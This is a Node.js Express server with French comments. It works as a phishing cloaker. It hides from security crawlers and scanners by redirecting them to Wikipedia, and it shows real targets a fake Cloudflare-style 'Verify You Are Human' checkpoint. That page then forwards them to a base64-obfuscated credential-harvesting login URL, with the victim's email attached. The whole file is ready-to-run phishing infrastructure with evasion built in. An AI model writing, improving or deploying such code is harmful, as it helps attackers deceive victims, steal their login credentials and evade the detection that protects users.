const express = require('express');
const app = express();

// --- CONFIGURATION ---
const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    // 1. COLLECTE DES INFOS
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const referrer = req.headers['referrer'] || req.headers['referer'] || "";
    const targetEmail = req.query.m || "";
    
    // --- AJOUT POUR TEST RAPIDE ---
    // Si tu ajoutes &debug=true dans ton URL, le cloaker te laisse passer
    const isDebug = req.query.debug === "true";

    // 2. LE CLOAKING PUISSANT (FILTRAGE DES BOTS)
    const isBotUA = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
    const isBotReferrer = referrer === "";

    // On bloque si c'est un bot OU s'il n'y a pas de referrer (SAUF si on est en mode debug)
    if (!isDebug && (isBotUA || isBotReferrer)) {
        console.log("Bot ou accès direct détecté. Redirection Wikipedia.");
        return res.redirect("https://www.wikipedia.org");
    }

    // 3. GENERATION DE LA LANDING PAGE "CLOUDFLARE STYLE"
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Security Checkpoint</title>
            <style>
                body {
                    background: #f4f7f9;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    height: 100vh;
                    margin: 0;
                    color: #333;
                }
                .container {
                    background: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                    text-align: left;
                    max-width: 450px;
                    width: 90%;
                    position: relative;
                }
                .header {
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    border-bottom: 1px solid #e0e6ed;
                    padding-bottom: 15px;
                    margin-bottom: 20px;
                }
                .logo-section {
                    display: flex;
                    align-items: center;
                    color: #007bff;
                    font-weight: 600;
                    font-size: 14px;
                }
                .lock-icon {
                    margin-right: 10px;
                    font-size: 18px;
                }
                .dots-icon {
                    color: #ccc;
                    font-size: 20px;
                }
                h2 {
                    color: #1b1f23;
                    font-size: 22px;
                    margin: 0 0 10px 0;
                    font-weight: 700;
                }
                p {
                    font-size: 15px;
                    line-height: 1.6;
                    color: #586069;
                    margin: 0 0 25px 0;
                }
                .status-box {
                    background: #f8f9fa;
                    border: 1px solid #e0e6ed;
                    border-radius: 4px;
                    padding: 15px;
                    display: flex;
                    align-items: center;
                }
                .loader {
                    border: 3px solid rgba(0,0,0,0.1);
                    border-top: 3px solid #007bff;
                    border-radius: 50%;
                    width: 24px;
                    height: 24px;
                    animation: spin 1s linear infinite;
                    margin-right: 15px;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                .status-text {
                    color: #1b1f23;
                    font-weight: 600;
                    font-size: 15px;
                }
                .sub-text {
                    color: #586069;
                    font-size: 13px;
                    font-weight: 400;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo-section">
                        <span class="lock-icon">🔒</span> SECURITY CHECKPOINT
                    </div>
                    <div class="dots-icon">•••</div>
                </div>
                <h2>Verify You Are Human</h2>
                <p>Please wait while we check your browser...</p>
                
                <div class="status-box">
                    <div class="loader"></div>
                    <div>
                        <div class="status-text">Verifying...</div>
                        <div class="sub-text">Click to verify your browser</div>
                    </div>
                </div>
            </div>

            <script>
                const p1 = "${part1}";
                const p2 = "${part2}";
                const em = "${targetEmail}";

                setTimeout(() => {
                    document.querySelector('.status-text').innerText = "Vérification réussie ! Redirecting...";
                    document.querySelector('.sub-text').innerText = "Connexion sécurisée établie";
                    document.querySelector('.loader').style.borderTopColor = "#28a745"; 

                    let target = atob(p1) + atob(p2);
                    if(em !== "") {
                        target += "#" + em;
                    }
                    window.location.href = target;
                }, 4000); 
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Serveur prêt sur le port \${PORT}`);
});
